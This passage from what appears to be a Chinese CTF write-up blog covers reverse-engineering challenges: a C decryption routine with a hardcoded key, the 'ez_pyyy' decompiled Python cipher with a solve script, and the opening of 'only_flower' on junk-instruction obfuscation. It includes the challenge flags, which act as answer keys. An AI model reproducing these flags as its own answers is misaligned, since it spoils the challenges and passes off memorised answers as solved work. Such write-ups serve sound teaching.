</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">expand_key</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key_str</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">expanded_key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">expanded_key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">key_str</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">i</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">                         <span class="p">((</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">key_str</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">                         <span class="p">((</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">key_str</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">2</span><span class="p">]</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">                         <span class="p">(</span><span class="kt">uint8_t</span><span class="p">)</span><span class="n">key_str</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">decrypt_data</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">encrypted_data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">encrypted_len</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                 <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key_str</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">decrypted_data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl">    <span class="kt">uint32_t</span> <span class="n">expanded_key</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">expand_key</span><span class="p">(</span><span class="n">key_str</span><span class="p">,</span> <span class="n">expanded_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">temp_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">encrypted_len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">,</span> <span class="n">encrypted_data</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">k</span> <span class="o">&lt;</span> <span class="n">encrypted_len</span><span class="p">;</span> <span class="n">k</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">dec_block</span><span class="p">(</span><span class="n">temp_buffer</span> <span class="o">+</span> <span class="n">k</span><span class="p">,</span> <span class="n">expanded_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">padding</span> <span class="o">=</span> <span class="n">temp_buffer</span><span class="p">[</span><span class="n">encrypted_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">padding</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">padding</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Error: Invalid padding</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">original_len</span> <span class="o">=</span> <span class="n">encrypted_len</span> <span class="o">-</span> <span class="n">padding</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">,</span> <span class="n">temp_buffer</span><span class="p">,</span> <span class="n">original_len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">temp_buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">original_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="s">&#34;geek2025reverse!&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="n">encrypted_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mh">0xE6</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x8D</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x9C</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x9D</span><span class="p">,</span> <span class="mh">0xFE</span><span class="p">,</span> <span class="mh">0x6C</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xDD</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x8F</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x0E</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0xB9</span><span class="p">,</span> <span class="mh">0x5C</span><span class="p">,</span> <span class="mh">0x3B</span><span class="p">,</span> <span class="mh">0xF5</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0xCA</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xA3</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xFC</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0xBE</span>
</span></span><span class="line"><span class="cl">    <span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">encrypted_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">decrypted_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">encrypted_len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">decrypted_len</span> <span class="o">=</span> <span class="nf">decrypt_data</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">,</span> <span class="n">encrypted_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">decrypted_data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">decrypted_len</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Output:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">decrypted_len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%c&#34;</span><span class="p">,</span> <span class="n">decrypted_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{St4nd4rd_Funct10n_N0t_4lw4ys_St4nd4rd}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ez_pyyy">ez_pyyy
</h3><h4 id="解题流程-9">解题流程
</h4><p>直接把pyc文件还原成py文件得到</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># Decompiled with PyLingual (https://pylingual.io)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Internal filename: 太好了是python糕手我们有救了.py</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Bytecode version: 3.8.0rc1+ (3413)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Source timestamp: 2025-10-04 12:43:26 UTC (1759581806)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span><span class="mi">48</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">54</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">str_to_hex_bytes</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="n">key</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">en3</span><span class="p">(</span><span class="n">b</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">240</span> <span class="o">|</span> <span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">15</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">en33</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;整体 bitstream 循环左移 n 位&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">bit_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="n">bit_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">n</span> <span class="o">|</span> <span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="n">bit_len</span> <span class="o">-</span> <span class="n">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit_len</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">str_to_hex_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">enc</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">17</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">en3</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">en33</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="o">==</span> <span class="n">cipher</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Correct! &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Wrong&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>加密很简单，总之就是将字符串转换为字节、异或操作、交换每个字节的高低4位、反转字节序列、整体循环左移32位,直接反过来跑一遍就行</p>
<h4 id="exp-9">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">cipher</span> <span class="o">=</span> <span class="p">[</span><span class="mi">48</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">53</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">54</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">54</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">en3</span><span class="p">(</span><span class="n">b</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">b</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">240</span> <span class="o">|</span> <span class="n">b</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span> <span class="o">&amp;</span> <span class="mi">15</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">en33</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">n</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;整体 bitstream 循环左移 n 位&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">bit_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="n">bit_len</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span> <span class="o">=</span> <span class="p">(</span><span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="n">n</span> <span class="o">|</span> <span class="n">val</span> <span class="o">&gt;&gt;</span> <span class="n">bit_len</span> <span class="o">-</span> <span class="n">n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit_len</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span><span class="o">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 将 cipher 转换为十六进制字符串</span>
</span></span><span class="line"><span class="cl"><span class="n">target_hex</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cipher</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">encrypted</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">target_hex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">total_bits</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="n">data1</span> <span class="o">=</span> <span class="n">en33</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">total_bits</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data2</span> <span class="o">=</span> <span class="n">data1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data3</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">en3</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data2</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data4</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">b</span> <span class="o">^</span> <span class="mi">17</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data3</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">data4</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-1">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{jtfgdsfda554_a54d8as53}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="only_flower">only_flower
</h3><h4 id="解题流程-10">解题流程
</h4><p>直接打开ida看不了伪代码，需要先解决花指令的混淆
